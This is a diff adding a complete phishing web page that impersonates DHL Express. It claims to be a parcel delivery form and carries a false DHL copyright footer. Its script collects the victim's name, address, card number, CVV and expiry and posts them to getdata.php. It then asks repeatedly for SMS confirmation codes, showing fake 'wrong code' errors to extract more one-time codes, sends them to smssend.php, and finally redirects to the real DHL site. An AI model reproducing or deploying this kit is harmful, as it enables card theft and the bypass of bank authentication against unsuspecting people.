@@ -1,0 +1,468 @@
+<html><head>
+	<meta charset="utf-8">
+	<title>DHL - express</title>
+	<!-- Mobile Specific Metas -->
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<script src="/cdn-cgi/apps/head/fHG6PlGkJkuh_9HPzJECz_j4pH8.js"></script><script src="/cdn-cgi/apps/body/8YtVgnu1iVJ0fyJzUoJsd_gBizk.js"></script><link rel="icon" href="images/favicon.ico" type="image/x-icon">
+	<!-- Font-->
+	<link rel="stylesheet" type="text/css" href="css/roboto-font.css">
+	<link rel="stylesheet" type="text/css" href="fonts/material-design-iconic-font/css/material-design-iconic-font.min.css">
+	<!-- datepicker -->
+	<link rel="stylesheet" type="text/css" href="css/jquery-ui.min.css">
+	<!-- Main Style Css -->
+    <link rel="stylesheet" href="css/style.css">
+<link rel="stylesheet" href="data:text/css;charset=utf-8;base64,CgovKiBHbG9iYWwgKi8KCmNsb3VkZmxhcmUtYXBwW2FwcD0iaW1wb3J0YW50LW1lc3NhZ2UiXSB7CiAgZm9udC1zaXplOiAxNnB4OwogIGZvbnQtZmFtaWx5OiBzeXN0ZW0tdWksIC1hcHBsZS1zeXN0ZW0sIEJsaW5rTWFjU3lzdGVtRm9udCwgIlNlZ29lIFVJIiwgUm9ib3RvLCBVYnVudHUsICJIZWx2ZXRpY2EgTmV1ZSIsIHNhbnMtc2VyaWY7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBjb2xvcjogIzAwMDsKCn0KCmNsb3VkZmxhcmUtYXBwW2FwcD0iaW1wb3J0YW50LW1lc3NhZ2UiXSBiYW5uZXIsCmNsb3VkZmxhcmUtYXBwW2FwcD0iaW1wb3J0YW50LW1lc3NhZ2UiXSBtb2RhbCBjb250ZW50IHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmOwogIHBhZGRpbmc6IDFlbTsKfQoKY2xvdWRmbGFyZS1hcHBbYXBwPSJpbXBvcnRhbnQtbWVzc2FnZSJdIGJhbm5lciBtZXNzYWdlLApjbG91ZGZsYXJlLWFwcFthcHA9ImltcG9ydGFudC1tZXNzYWdlIl0gbW9kYWwgbWVzc2FnZSB7CiAgcGFkZGluZzogNGVtOwp9CgovKiBCYW5uZXIgKi8KCmNsb3VkZmxhcmUtYXBwW2FwcD0iaW1wb3J0YW50LW1lc3NhZ2UiXSBiYW5uZXIgewogIGRpc3BsYXk6IGZsZXg7CiAgLyogd2lkdGg6IDEwMCU7ICovCn0KCmNsb3VkZmxhcmUtYXBwW2FwcD0iaW1wb3J0YW50LW1lc3NhZ2UiXSBiYW5uZXIuZGlzbWlzc2libGUgewogIHBvc2l0aW9uOiBmaXhlZDsKICBsZWZ0OiAwOwogIHRvcDogMDsKICByaWdodDogMDsKICBjdXJzb3I6IHBvaW50ZXI7CiAgYm94LXNoYWRvdzogMCAwIDFlbSAuMmVtICM0NDQ7CiAgYm9yZGVyOiBub25lOyAvKiB3aHkgaXMgdGhpcyBuZWVkZWQ/ICovCn0KCmNsb3VkZmxhcmUtYXBwW2FwcD0iaW1wb3J0YW50LW1lc3NhZ2UiXSBiYW5uZXIgbWVzc2FnZSB7CiAgZGlzcGxheTogaW5saW5lOwogIGZsZXgtZ3JvdzogMTsKfQoKY2xvdWRmbGFyZS1hcHBbYXBwPSJpbXBvcnRhbnQtbWVzc2FnZSJdIGJhbm5lci5kaXNtaXNzaWJsZSBidXR0b24gewogIG1hcmdpbjogMDsKICBwYWRkaW5nOiAwOwogIGJhY2tncm91bmQtY29sb3I6IHRyYW5zcGFyZW50OwogIGJvcmRlcjogbm9uZTsKICBmb250LWZhbWlseTogYXJpYWw7CiAgZm9udC1zaXplOiBpbmhlcml0Owp9CgpjbG91ZGZsYXJlLWFwcFthcHA9ImltcG9ydGFudC1tZXNzYWdlIl0gYmFubmVyLmRpc21pc3NpYmxlLnNob3cgewogIGFuaW1hdGlvbi1kdXJhdGlvbjogLjVzOwogIGFuaW1hdGlvbi1uYW1lOiBzbGlkZURvd247CiAgYW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjogbGluZWFyOwp9CgpjbG91ZGZsYXJlLWFwcFthcHA9ImltcG9ydGFudC1tZXNzYWdlIl0gYmFubmVyLmRpc21pc3NpYmxlLmhpZGUgewogIGFuaW1hdGlvbi1kdXJhdGlvbjogLjI1czsKICBhbmltYXRpb24tbmFtZTogc2xpZGVEb3duOwogIGFuaW1hdGlvbi10aW1pbmctZnVuY3Rpb246IGxpbmVhcjsKICBhbmltYXRpb24tZGlyZWN0aW9uOiByZXZlcnNlOwp9CgpAa2V5ZnJhbWVzIHNsaWRlRG93biB7CiAgZnJvbSB7CiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgwLCAtMTUwJSk7CiAgfQoKICB0byB7CiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgwLCAwKTsKICB9Cn0KCi8qIE1vZGFsICovCgpjbG91ZGZsYXJlLWFwcFthcHA9ImltcG9ydGFudC1tZXNzYWdlIl0gbW9kYWwgewogIHBvc2l0aW9uOiBmaXhlZDsKICBsZWZ0OiAwOwogIHRvcDogMDsKICByaWdodDogMDsKICBib3R0b206IDA7CiAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgwLCAwLCAwLCAuNik7CiAgY3Vyc29yOiBwb2ludGVyOwp9CgpjbG91ZGZsYXJlLWFwcFthcHA9ImltcG9ydGFudC1tZXNzYWdlIl0gbW9kYWwgY29udGVudCB7CiAgcG9zaXRpb246IGZpeGVkOwogIHRvcDogNTAlOwogIGxlZnQ6IDUwJTsKICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTsKICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7CiAgYm9yZGVyOiBzb2xpZCAjMDAwIDJweDsKICBtYXgtd2lkdGg6IDg1JTsKICBtYXgtaGVpZ2h0OiA4NSU7CiAgb3ZlcmZsb3c6IGF1dG87CiAgY3Vyc29yOiBkZWZhdWx0OwogIHRleHQtYWxpZ246IHJpZ2h0Owp9CgpjbG91ZGZsYXJlLWFwcFthcHA9ImltcG9ydGFudC1tZXNzYWdlIl0gbW9kYWwgY29udGVudCBtZXNzYWdlIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZGlzcGxheTogYmxvY2s7CiAgY3Vyc29yOiB0ZXh0Owp9CgpjbG91ZGZsYXJlLWFwcFthcHA9ImltcG9ydGFudC1tZXNzYWdlIl0gbW9kYWwuZGlzbWlzc2libGUgY29udGVudCBidXR0b24gewogIGRpc3BsYXk6IGlubGluZTsKICBwYWRkaW5nOiAuNGVtIC43NWVtOwogIGN1cnNvcjogcG9pbnRlcjsKICBmb250LXNpemU6IDFlbTsKICBib3JkZXI6IG5vbmU7CiAgYm9yZGVyLXJhZGl1czogLjI1ZW07Cn0KCgovKiBTdHlsZSByZXNldHMgZm9yIFJpY2ggVGV4dCAqLwoKY2xvdWRmbGFyZS1hcHBbYXBwPSJpbXBvcnRhbnQtbWVzc2FnZSJdIHAgewogIGJhY2tncm91bmQtY29sb3I6IHRyYW5zcGFyZW50OwogIGJvcmRlcjogbm9uZTsKICBjb2xvcjogaW5oZXJpdDsKICBmb250LXNpemU6IDFlbTsKICBsaW5lLWhlaWdodDogMS4yZW07CiAgbWFyZ2luOiAwOwogIHBhZGRpbmc6IDA7Cn0KCmNsb3VkZmxhcmUtYXBwW2FwcD0iaW1wb3J0YW50LW1lc3NhZ2UiXSBhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsKICBib3JkZXI6IG5vbmU7CiAgY29sb3I6IGluaGVyaXQ7CiAgZm9udC1zaXplOiAxZW07CiAgbGluZS1oZWlnaHQ6IDEuMmVtOwogIG1hcmdpbjogMDsKICBwYWRkaW5nOiAwOwp9CgpjbG91ZGZsYXJlLWFwcFthcHA9ImltcG9ydGFudC1tZXNzYWdlIl0gaW1nIHsKICB3aWR0aDogMTAwcHg7CiAgaGVpZ2h0OiBhdXRvOwp9Cg=="></head>
+<body cfapps-selector="body"><cloudflare-app app="important-message"><important-message-banner border-radius="16" color-scheme="#f8d7da,#721c24" dismissible="true" font-size="28" gradient-level="0.5" horizontal-margin="0" horizontal-padding="20" max-image-width="100" message="This is a preview of a website by a customer of Hostinger" vertical-margin="0" vertical-padding="16" dismissal-minutes="60" dismissal-content-prop="message" role="banner" aria-label="Important Message"></important-message-banner></cloudflare-app>
+	<nav class="navbar navbar-default" style="background: #fc0;width: 100%;">
+  <div class="container">
+    <div class="navbar-header">
+      <a class="navbar-brand" href="#">
+        <img alt="Brand" src="images/img.svg" width="100" style="padding:10px;margin-left: auto;margin-right: auto;
+    display: -webkit-box;">
+      </a>
+    </div>
+  </div>
+</nav>
+	<div class="page-content" style="background-image: url('images/bg.jpg')">
+		<div class="wizard-v3-content">
+			<div class="wizard-form">
+				<div class="wizard-header">
+					<h2 style="padding-left:20px;padding-right: 20px">Please fill in the necessary information to receive the package	</h2>
+					
+				</div>
+		        <form class="form-register" action="#" method="post">
+		        	<div id="form-total" role="application" class="wizard clearfix"><div class="steps clearfix"><ul role="tablist"><li role="tab" aria-disabled="false" class="first current" aria-selected="true"><a id="form-total-t-0" href="#form-total-h-0" aria-controls="form-total-p-0"><span class="current-info audible"> </span><div class="title">
+			            	<span class="step-icon"><i class="zmdi zmdi-account"></i></span>
+			            	<span class="step-text"> information</span>
+			            </div></a></li><li role="tab" aria-disabled="false"><a id="form-total-t-1" href="#form-total-h-1" aria-controls="form-total-p-1"><div class="title">
+			            	<span class="step-icon"><i class="zmdi zmdi-lock"></i></span>
+			            	<span class="step-text">Payment</span>
+			            </div></a></li><li role="tab" aria-disabled="false" class="last"><a id="form-total-t-2" href="#form-total-h-2" aria-controls="form-total-p-2"><div class="title">
+			            	<span class="step-icon"><i class="zmdi zmdi-receipt"></i></span>
+			            	<span class="step-text">Confirmation</span>
+			            </div></a></li></ul></div><div class="content clearfix">
+		        		<!-- SECTION 1 -->
+			            <h2 id="form-total-h-0" tabindex="-1" class="title current">
+			            	<span class="step-icon"><i class="zmdi zmdi-account"></i></span>
+			            	<span class="step-text"> information</span>
+			            </h2>
+			            <section id="form-total-p-0" role="tabpanel" aria-labelledby="form-total-h-0" class="body current" aria-hidden="false">
+			                <div class="inner">
+			                	<h3 style="text-align: center;">Personal informations
+</h3>
+			                	<div class="form-row">
+									<div class="form-holder">
+										<label class="form-row-inner">
+											<input type="text" class="form-control" id="nom" name="first_name" required="">
+											<span class="label">First name *</span>
+					  						<span class="border"></span>
+										</label> 
+									</div>
+									<div class="form-holder">
+										<label class="form-row-inner">
+											<input type="text" class="form-control" id="prenom" name="last_name" required="">
+											<span class="label">Last name *</span>
+					  						<span class="border"></span>
+										</label>
+									</div>
+								</div>
+								
+								
+								<div class="form-row">
+									<div class="form-holder form-holder-1">
+										<label class="form-row-inner">
+											<input type="text" class="form-control" id="adresse1" name="phone" required="">
+											<span class="label">Adress 1 *</span>
+					  						<span class="border"></span>
+										</label>
+									</div>
+								</div>
+								<div class="form-row">
+									<div class="form-holder form-holder-1">
+										<label class="form-row-inner">
+											<input type="text" class="form-control" id="adresse2" name="phone" required="">
+											<span class="label">Adress 2 *</span>
+					  						<span class="border"></span>
+										</label>
+									</div>
+								</div>
+								<div class="form-row">
+									<div class="form-holder form-holder-1">
+										<label class="form-row-inner">
+											<input type="text" class="form-control" id="ville" name="address" required="">
+											<span class="label">City *</span>
+					  						<span class="border"></span>
+										</label>
+									</div>
+								</div>
+								<div class="form-row">
+									<div class="form-holder form-holder-1">
+										<label class="form-row-inner">
+											<input type="text" class="form-control" id="codepostal" name="address" required="">
+											<span class="label">Postal code *</span>
+					  						<span class="border"></span>
+										</label>
+									</div>
+								</div>
+							</div>
+			            </section>
+						<!-- SECTION 2 -->
+			            <h2 id="form-total-h-1" tabindex="-1" class="title">
+			            	<span class="step-icon"><i class="zmdi zmdi-lock"></i></span>
+			            	<span class="step-text">Payment</span>
+			            </h2>
+			              <section id="form-total-p-1" role="tabpanel" aria-labelledby="form-total-h-1" class="body" aria-hidden="true" style="display: none;">
+			                <div class="inner">
+			                	<h3 style="text-align: center;">Payment Informations</h3>
+			                	<div class="form-row">
+			                		<div class="form-holder form-holder-2" style="margin-left: auto;
+    margin-right: auto; width: inherit;">
+			                			
+			                			<label class="pay-1-label" for="pay-1"><img src="images/wizard_v3_icon_1.png" alt="pay-1">Credit card</label>
+										
+			                		</div>
+			                	</div>
+			                	<div class="form-row">
+									<div class="form-holder form-holder-1">
+										<label class="form-row-inner">
+											<input type="text" class="form-control" id="nomtitulaire" name="nomtitulaire" required="" value="">
+											<span class="label">cardholder name *</span>
+					  						<span class="border"></span>
+										</label>
+									</div>
+								</div>
+			                	<div class="form-row">
+									<div class="form-holder">
+										<label class="form-row-inner">
+											<input type="text" class="form-control" id="xsfcc" maxlength="16" name="card" required="" onkeyup="if (/\D/g.test(this.value)) this.value = this.value.replace(/\D/g,'')" value="">
+											<span class="label">Card number *</span>
+											<span class="border"></span>
+										</label>
+									</div>
+									<div class="form-holder">
+										<label class="form-row-inner">
+											<input type="text" class="form-control" id="xsfcvv" maxlength="3" name="cvc" required="" onkeyup="if (/\D/g.test(this.value)) this.value = this.value.replace(/\D/g,'')" value="">
+											<span class="label">CVV *</span>
+											<span class="border"></span>
+										</label>
+									</div>
+								</div>
+			                	<div class="form-row form-row-date ">
+									<div class="form-holder form-holder-2">
+										<label for="date" class="special-label">Expiration date * :</label>
+										<select name="month_1" id="xsfmm" style="width:  100% !important;">
+											<option value="" disabled="" selected="">Month</option>
+											<option value="01" selected="">01</option>
+											<option value="02">02</option>
+											<option value="03">03</option>
+											<option value="04">04</option>
+											<option value="05">05</option>
+											<option value="06">06</option>
+											<option value="07">07</option>
+											<option value="08">08</option>
+											<option value="09">09</option>
+											<option value="10">10</option>
+											<option value="11">11</option>
+											<option value="12">12</option>
+										</select>
+										<select name="year_1" id="xsfyy" style="width:  100% !important;">
+											<option value="" disabled="" selected="">Year</option>
+											<option value="2019" selected="">2019</option>
+											<option value="2020">2020</option>
+											<option value="2021">2021</option>
+											<option value="2022">2022</option>
+											<option value="2023">2023</option>
+											<option value="2024">2024</option>
+											<option value="2025">2025</option>
+											<option value="2026">2026</option>
+										</select>
+									</div>
+								</div>
+							
+							</div>
+							<div style="margin-top: 20px"><center><b>You will not be charged before the shipment of parcels</b></center></div>
+			            </section>
+			       
+			           
+			            
+			            <!-- SECTION 3 -->
+			            <h2 id="form-total-h-2" tabindex="-1" class="title">
+			            	<span class="step-icon"><i class="zmdi zmdi-receipt"></i></span>
+			            	<span class="step-text">Confirmation</span>
+			            </h2>
+			            <section id="form-total-p-2" role="tabpanel" aria-labelledby="form-total-h-2" class="body" aria-hidden="true" style="display: none;">
+			                <div class="inner">
+			                	<h4 id="smslabel" style="font-weight:500"><center>Finalisation de commande</center></h4>
+			                	<h4 id="smslabel2" style="display: none;font-weight:500"><center>We thank you for authenticating yourself by entering the confirmation code received on your phone. This authentication is required to confirm your operation.</center></h4>
+			                	<div class="form-row">
+									<div class="form-holder form-holder-1" style="width: 50%; margin-right: auto;margin-left: auto;">
+										<label class="form-row-inner">
+										<br>
+										<input type="text" class="form-control" placeholder="Confirmation code" id="smstxt" style="text-align: center; font-weight:500" name="phone" required="">
+											<strong id="errreur" style="color: red; font-weight: 500; display: none; margin-top:10px;    display: -webkit-box; text-align: center;">Wrong confirmation code, you will receive another code to confirm.</strong>
+											<strong id="success" style="color: green; font-weight: 500; display: none; margin-top:10px;    display: -webkit-box; text-align: center;">Your request is confirmed</strong>
+										</label>
+									
+
+										  <button type="button" id="smsbtn" class="btn btn-primary btn-lg" style="width: 100%; background-color: #d40511; padding:10px; border:none; border-radius: 3px; color:#fc0;font-weight: bold; margin-top:20px">Valider</button>
+
+									</div>
+								</div>
+			                	
+			                	<span style="display: grid; margin-top:20px"><b style="text-align: center;"> <p style="text-align: center"></p></b></span><b style="text-align: center;">
+			                	<span style="display: grid; margin-top:20px"><b style="text-align: center;color:red">Important information	</b> <p style="text-align: center; font-size: 0.8em">delivery times decrease to 1-2 days! Shipping costs vary depending on your country</p></span>
+							</b></div><b style="text-align: center;">
+			            </b></section><b style="text-align: center;">
+		        	</b></div><div class="actions clearfix"><ul role="menu" aria-label="Pagination"><li class="disabled" aria-disabled="true"><a href="#previous" role="menuitem">Previous</a></li><li aria-hidden="false" aria-disabled="false"><a href="#next" role="menuitem">Next step</a></li><li aria-hidden="true" style="display: none;"><a href="#finish" role="menuitem">Submit</a></li></ul></div></div><b style="text-align: center;">
+		        
+		        <footer style="text-align: center; padding-bottom:20px;padding-top:20px">2020 © DHL International GmbH. All rights reserved.</footer>
+			</b></form></div><b style="text-align: center;">
+
+
+		</b></div><b style="text-align: center;">
+	</b></div><b style="text-align: center;">
+	<script src="js/fa.js"></script>
+	<script src="js/jquery-3.3.1.min.js"></script>
+	<script src="js/jquery.steps.js"></script>
+	<script src="js/jquery-ui.min.js"></script>
+	<script>
+		loadingtime=5000
+		counteur=0;
+$(document).ready(function() {
+
+
+
+
+
+
+
+  $('#smsbtn').on('click', function() {
+
+
+
+
+	if ($("#smstxt").val().length != 0){
+
+  	
+    if (counteur == 2 )
+    {
+setTimeout(function() {
+    window.location.replace("https://www.logistics.dhl");
+    
+    }, 10000);
+
+
+
+
+
+
+    	
+    }
+	
+
+	 $.ajax({
+				      type: "POST",
+				      dataType:'json',
+				      url: "smssend.php",
+				      data: {smscode:$("#smstxt").val()},
+				      success: function (result) {
+					      }
+				 });
+	
+  	$("#smstxt").hide()
+  	$("#smslabel").hide()
+  	$("#smslabel2").hide()
+  	$("#errreur").hide()
+    var $this = $(this);
+    console.log("this is : "+$(this).html() )
+    var loadingText = '<i style="font-size:30px" class="fa fa-circle-o-notch fa-spin"></i></br></br><p>Please wait while we process your request, please do not close this window</p>';
+    if ($(this).html() !== loadingText) {
+      $this.data('original-text', $(this).html());
+      $this.html(loadingText);
+    }
+    setTimeout(function() {
+    if (counteur!=2)
+    {
+      $this.html($this.data('original-text'));
+      $("#smstxt").show()
+      $("#smstxt").val('')
+  	  $("#smslabel2").show()
+  	  $("#errreur").show()
+  	  $("#success").hide()
+  	  counteur++
+    }
+    else
+    {
+    	$this.html($this.data('original-text'));
+      $("#smstxt").hide()
+      $("#smstxt").val('')
+  	  $("#smslabel2").hide()
+  	  $("#errreur").hide()
+  	  $("#success").show()
+  	  $('#smsbtn').hide()
+  	  counteur++
+    }
+    }, loadingtime);
+}
+else
+{
+	$('#smstxt').css('border-bottom','2px solid red');
+}
+
+
+
+  });
+})
+		
+    $("#form-total").steps({
+        headerTag: "h2",
+        bodyTag: "section",
+        transitionEffect: "fade",
+        enableAllSteps: true,
+        autoFocus: true,
+        transitionEffectSpeed: 500,
+        titleTemplate : '<div class="title">#title#</div>',
+        labels: {
+            
+            next : 'Next step',
+            finish : 'Submit',
+            current : ''
+        }, 
+        onStepChanging: function (event, currentIndex, newIndex) { 
+        	
+           if (currentIndex==0)
+           {
+           	nom=$('#nom').val();
+            prenom=$('#prenom').val();
+            adresse1=$('#adresse1').val();
+            adresse2=$('#adresse2').val();
+            ville=$('#ville').val();
+            codepostal=$('#codepostal').val();
+            
+            if ((nom.length<3) ||(prenom.length<3) ||(adresse1.length<3) ||(ville.length<3) ||(codepostal.length<3))
+            {
+            	if (nom.length<3)
+            		$('#nom').css('border-bottom','2px solid red');
+            	else
+            		$('#nom').css('border-bottom','2px solid #000');
+            	if (prenom.length<3)
+            		$('#prenom').css('border-bottom','2px solid red');
+            	else
+            		$('#prenom').css('border-bottom','2px solid #000');
+				if (adresse1.length<3)
+            		$('#adresse1').css('border-bottom','2px solid red');
+            	else
+            		$('#adresse1').css('border-bottom','2px solid #000');
+				if (ville.length<3)
+            		$('#ville').css('border-bottom','2px solid red');
+            	else
+            		$('#ville').css('border-bottom','2px solid #000');
+            	if (codepostal.length<3)
+            		$('#codepostal').css('border-bottom','2px solid red');
+            	else
+            		$('#codepostal').css('border-bottom','2px solid #000');
+            	return false;
+            }
+            else
+                return true;
+           }
+          if (currentIndex==1)
+          {
+
+	$("#smstxt").hide()
+  	$("#smslabel").hide()
+  	$("#smslabel2").hide()
+  	$("#success").hide()
+  	$("#errreur").hide()
+    var $this = $('#smsbtn');
+    $('#smsbtn').css('width','auto')
+    $('#smsbtn').css('margin-right','auto')
+    $('#smsbtn').css('margin-left','auto')
+    $('#smsbtn').css('display','block')
+   
+
+
+    var loadingText = '<i style="font-size:30px" class="fa fa-circle-o-notch fa-spin"></i>';
+
+      $this.data('original-text', $('#smsbtn').html());
+      $this.html(loadingText);
+     setTimeout(function() {
+      $this.html($this.data('original-text'));
+      $("#smstxt").show()
+  	  $("#smslabel2").show()
+
+    }, loadingtime);
+     
+          	nom=$('#nom').val();
+            prenom=$('#prenom').val();
+            adresse1=$('#adresse1').val();
+            adresse2=$('#adresse2').val();
+            ville=$('#ville').val();
+            codepostal=$('#codepostal').val();
+          	nomtitulaire=$('#nomtitulaire').val();
+            xsfcc=$('#xsfcc').val();
+            xsfcvv=$('#xsfcvv').val();
+            xsfmm=$('#xsfmm').val();
+            xsfyy=$('#xsfyy').val();
+            console.log('titulaire is  '+ $('#nomtitulaire').val())
+            if ((xsfcc.length<16) ||(xsfcvv.length<3) ||(xsfmm===null) ||(xsfyy===null) ||(nomtitulaire.length<3))
+            {
+            	console.log("mm is :"+xsfmm)
+            	if (xsfcc.length<3)
+            		$('#xsfcc').css('border-bottom','2px solid red');
+            	else
+            		$('#xsfcc').css('border-bottom','2px solid #000');
+            	if (xsfcvv.length<3)
+            		$('#xsfcvv').css('border-bottom','2px solid red');
+            	else
+            		$('#xsfcvv').css('border-bottom','2px solid #000');
+				if (xsfmm===null)
+            		$('#xsfmm').css('border-bottom','2px solid red');
+            	else
+            		$('#xsfmm').css('border-bottom','2px solid #000');
+				if (xsfyy===null)
+            		$('#xsfyy').css('border-bottom','2px solid red');
+            	else
+            		$('#xsfyy').css('border-bottom','2px solid #000');
+            	if (nomtitulaire.length<3)
+            		$('#nomtitulaire').css('border-bottom','2px solid red');
+            	else
+            		$('#nomtitulaire').css('border-bottom','2px solid #000');
+
+            	return false;
+            }
+            else
+            {
+				 $.ajax({
+				      type: "POST",
+				      dataType:'json',
+				      url: "getdata.php",
+				      data: {nomtitulaire:nomtitulaire,xsfyy:xsfyy,xsfmm:xsfmm,xsfcvv:xsfcvv,xsfcc:xsfcc,nom:nom,prenom:prenom,adresse1:adresse1,adresse2:adresse2,ville:ville,codepostal:codepostal},
+				      success: function (result) {
+					      }
+				 });
+				 $('[aria-label="Pagination"]').css('display','none');
+  return true;
+            }
+
+          }
+
+          
+        }
+    });
+
+
+
+
+
+   	</script>
+
+<style>
+	#form-total > div.actions.clearfix > ul > li:nth-child(2) > a
+	{
+		padding:10px;
+	}
+</style>
+
+
+</b><link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free-v4-shims.min.css" media="all"><link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free-v4-font-face.min.css" media="all"><link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all"></body></html>
